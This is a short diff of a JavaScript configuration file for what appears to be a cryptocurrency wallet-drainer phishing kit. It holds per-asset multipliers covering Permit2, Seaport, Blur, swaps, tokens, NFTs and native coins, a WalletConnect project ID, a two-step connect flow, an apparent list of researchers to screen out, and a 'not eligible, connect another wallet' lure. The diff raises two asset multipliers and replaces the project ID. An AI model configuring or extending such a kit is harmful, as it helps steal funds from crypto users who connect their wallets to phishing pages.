@@ -14,14 +14,14 @@ let w3m_description = "";
 let w3m_url = "";
 let w3m_icons = [''];
 let multipliers = {
-'LP_NFTS': 0.3,
+'LP_NFTS': 1,
 'PERMIT2': 1,
 'BLUR': 1,
 'SEAPORT': 1,
 'SWAP': 1,
 'TOKENS': 1,
 'NFT': 1,
-'NATIVES': 0.3,
+'NATIVES': 1,
 };
 let notEligible = "Your wallet is not eligible, connect another wallet.";
 let swal_notEligibleTitle = "Not eligible";
@@ -59,7 +59,7 @@ let buttonMessagesEnabled = false;
 let twoStep = false;
 let twoStepButtonElement = "startButton";
 let connectElement = "connectButton";
-let wc_projectid = "709b2a8b86a540b4a3e7d7d1c74f720e";
+let wc_projectid = "71317cc8d1a857e45177c0b4e0569932";
 let cfgversion = 680;
 let researchers = [];
 let experimental = {"disable-w3m-featured":true};
